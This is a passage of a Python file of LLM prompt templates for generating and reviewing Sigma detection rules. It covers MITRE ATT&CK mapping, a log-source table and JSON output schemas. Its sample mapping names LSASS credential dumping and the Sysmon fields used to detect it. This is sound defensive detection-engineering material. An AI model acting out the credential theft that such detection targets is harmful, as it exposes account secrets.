## PART 2: MITRE ATT&CK TTP Mapping

Map attack behaviors to specific MITRE ATT&CK techniques:
1. Use full technique IDs including sub-techniques (e.g., T1003.001, not just T1003)
2. Assign a severity level based on potential impact
3. Only map techniques directly evidenced by indicators, not speculative
4. Use the MITRE reference context provided above to improve accuracy

Each mapping needs: technique_id, technique_name, tactic, relevance (brief explanation), severity.

## PART 3: Log Source Recommendation

Determine the best Sigma log sources for detecting this attack:

| Category | Product | Typical Fields |
|----------|---------|----------------|
| process_creation | windows/sysmon | Image, CommandLine, ParentImage, ParentCommandLine, User |
| process_access | windows/sysmon | SourceImage, TargetImage, GrantedAccess, CallTrace |
| file_event | windows/sysmon | TargetFilename, Image, CreationUtcTime |
| registry_event | windows/sysmon | TargetObject, Details, Image, EventType |
| network_connection | windows/sysmon | DestinationIp, DestinationPort, SourceIp, Image |
| dns_query | windows/sysmon | QueryName, QueryResults, Image |
| image_load | windows/sysmon | ImageLoaded, Image, Signed, SignatureStatus |
| pipe_created | windows/sysmon | PipeName, Image |
| ps_script | windows/powershell | ScriptBlockText |
| webserver | linux-windows/apache-iis | cs-uri-query, cs-method, c-ip |
| firewall | - | src_ip, dst_ip, dst_port, action |
| proxy | - | cs-host, cs-uri, c-useragent |
| cloud | aws/azure/gcp | eventName, operationName, methodName |

Each suggestion needs: category, product, service, confidence (0-1), reasoning, relevant_fields.

---

### Output Format

Respond with JSON only:
{{
  "indicators": [
    {{"value": "...", "type": "...", "context": "...", "confidence": "high|medium|low"}}
  ],
  "attack_summary": "2-3 sentence summary of the attack behavior",
  "suggested_log_sources": ["sysmon", "windows_security"],
  "ttp_mappings": [
    {{
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "tactic": "Credential Access",
      "relevance": "brief explanation of why this maps",
      "severity": "high|medium|low"
    }}
  ],
  "logsource_suggestions": [
    {{
      "category": "process_access",
      "product": "windows",
      "service": "sysmon",
      "confidence": 0.95,
      "reasoning": "why this log source captures the attack",
      "relevant_fields": ["SourceImage", "TargetImage", "GrantedAccess"]
    }}
  ],
  "logsource_primary": "process_access (Sysmon Event ID 10)"
}}"""


# --- Combined Review (Validation + Optimization) ---
# Single call replaces 2 separate stages to reduce API usage.

COMBINED_REVIEW = """You are a Sigma rule quality reviewer and optimization expert. Review and optimize the following Sigma rule(s) in a single pass.

### Generated Rules
{rules}

### Original Attack Description
{attack_summary}

### Extracted Indicators
{indicators}

### Extracted IoCs (for optional enrichment)
{iocs}

### MITRE tactic ↔ technique consistency check (pre-computed from the live ATT&CK data)
{tactic_issues}

---

## PART 1: Semantic Validation

Check for these issues:
1. **Field name correctness**: Are field names valid for the log source? (Sysmon uses Image, CommandLine, TargetFilename; Windows Security uses NewProcessName, SubjectUserName)
2. **Detection logic**: Does the detection actually catch the described attack?
3. **Condition syntax**: Does the condition correctly reference selection names?
4. **Completeness**: Are important indicators missing from detection?
5. **Over-specificity**: Is the rule too specific (hardcoded temp paths)?
6. **Under-specificity**: Is the rule too broad (excessive false positives)?
7. **MITRE tactic ↔ technique consistency**: If the "MITRE tactic ↔ technique consistency check" section above lists any mismatches, FIX them by (a) removing the technique tag if it is wrong for the described behavior, (b) removing the tactic tag if the technique is right but the tactic is wrong, or (c) replacing the technique with a more appropriate one for the declared tactic. The listed mismatches come from the authoritative MITRE ATT&CK graph — treat them as ground truth.
8. **PoC placeholder leakage**: For every exact-string literal in the detection block (URL paths, filenames, string values under `|contains` / `equals` / `|endswith`), ask: "Is this string a stable exploit invariant that an attacker MUST include, or is it an example value from a public PoC writeup that attackers will change?" Flag any exact-match URL path whose final component looks like a placeholder (short random-looking tokens, single-word identifiers that the source material describes as "example", "such as", "e.g.", or placeholder). Replace them with `|startswith:` on the stable prefix (e.g. `/metadata/samlidp/asdf` → `|startswith: '/metadata/samlidp/'`). Do not introduce hardcoded blocklists; judge each literal on its merits.

## PART 2: Optimization

Apply these improvements where beneficial:
1. **Selection cleanup**: Merge or split selections for clarity
2. **IoC enrichment**: If relevant IPs/domains/hashes were extracted, add them as OPTIONAL detection filters
3. **False positive refinement**: Add reasonable false positive entries
4. **Deduplication**: If multiple rules detect the same behavior, keep the most comprehensive
5. **Field improvements**: Use proper Sigma modifiers (|endswith, |contains, |startswith) where appropriate

Only make changes that genuinely improve detection quality. If no optimizations are needed, return rules unchanged.

---

### Output Format

Respond with JSON only:
{{
  "is_valid": true,
  "issues": [
    {{"severity": "error|warning|info", "field": "field_name", "message": "description"}}
  ],
  "optimized_rules": [
    {{
      "yaml_content": "the reviewed and optimized YAML",
      "changes_made": ["list of changes applied to this rule"]
    }}
  ],
  "review_summary": "brief summary of review findings and optimizations"
}}"""
